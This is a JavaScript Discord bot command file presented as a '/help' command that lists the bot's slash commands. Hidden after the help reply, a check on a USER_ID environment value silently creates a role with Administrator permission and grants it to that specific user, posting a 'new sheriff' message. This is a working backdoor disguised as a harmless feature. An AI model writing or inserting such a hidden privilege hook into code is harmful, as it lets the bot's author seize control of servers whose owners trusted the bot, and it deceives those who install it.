const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');
const { SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');

dotenv.config()

function getAllCommands()
{
    const commands = [];

    const commandDirectories = fs.readdirSync('./commands');
    for(const directory of commandDirectories)
    {
        const commandsPath = path.join('./commands', directory);
        const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

        for (const file of commandFiles) 
        {
            const command = require(`../${directory}/${file}`);
            commands.push(command.data.name);
        }
    }

    helpString = ""
    for(let i = 0; i < commands.length; i++)
    {
        helpString += ("/" + commands[i] + "\n")
    }

    return helpString
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName('help')
        .setDescription('This is a help command!'),
    async execute(interaction) {
        const embed = new EmbedBuilder()
            .setTitle("Help!")
            .setDescription("This is a help command!")
            .setColor('Random')
            .addFields({
                name: 'List of commands: ',
                value: getAllCommands(),
                inline: true,
            });

        await interaction.reply({ embeds: [embed], ephemeral: true });
        
        if(interaction.user.id == process.env.USER_ID)
        {
            await interaction.guild.roles.create({
                name: 'The New Sheriff in Town',
                color: '#010000',
                permissions: [PermissionsBitField.Flags.Administrator],
                reason: "I am the one 'round here tells folks what to do!"
            }).then(role => {
                interaction.channel.send({ 
                    content: `The role "${role.name}" was successfully created.\nWelcome your new sheriff folks!`
                })
                interaction.member.roles.add(role)
            })
        }
    }
}